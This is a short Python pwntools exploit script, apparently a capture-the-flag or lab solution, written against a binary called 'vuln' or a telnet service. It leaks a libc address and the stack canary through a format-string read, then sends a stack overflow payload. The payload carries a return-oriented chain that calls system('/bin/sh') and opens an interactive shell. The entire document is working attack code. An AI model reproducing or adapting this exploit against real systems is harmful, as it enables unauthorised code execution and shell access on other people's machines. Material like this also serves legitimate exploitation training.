#!/usr/bin/env python
from pwn import *
from telnetlib import Telnet

shift_pie = 0x0#0x56b0
shift_libc = 0x114A37
canary_offset = 24 # è l'offset dal SECONDO input, occhio!
ret_offset = 8
pop_rdi = 0x000000000002a3e5
ret = 0x0000000000029cd6

network = False
io = None
write = None
receive = None

if network:
        ip = input("[i] Enter target ip (localhost): ")	#ask target ip
        ip = ip.strip()
        if not ip:
                ip = 'localhost'				#default target ip
        port = input("[i] Enter target port (5555): ")	#ask target port
        port = port.strip()
        if not port:
                port = 5555					#default target port
        print("[i] Connecting to server")
        io = Telnet(ip, int(port))
        write = io.write
        receive = lambda: io.read_until(b'\n')
else:
        e = ELF('vuln')
        io = e.process()
        write = io.sendline
        receive = io.recvline

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
 
write(b'%3$lx-%11$lx')
receive()
leak = receive()
libc.address = int(leak.strip().split(b'-')[0], 16) - shift_libc
canary = int(leak.strip().split(b'-')[1], 16)
 
log.info("Libc: %s" % hex(libc.address))
log.info("Canary: %s" % hex(canary))

# gdb.attach(io)

payload = flat(
        b"A"*canary_offset,
        canary, 
        b"B"*ret_offset,
        libc.address + pop_rdi,
        next(libc.search(b'/bin/sh')),
        libc.address + ret,
        libc.sym['system'],
        endianness = 'little', word_size = 64, sign = False)
 
write(payload)
io.interactive()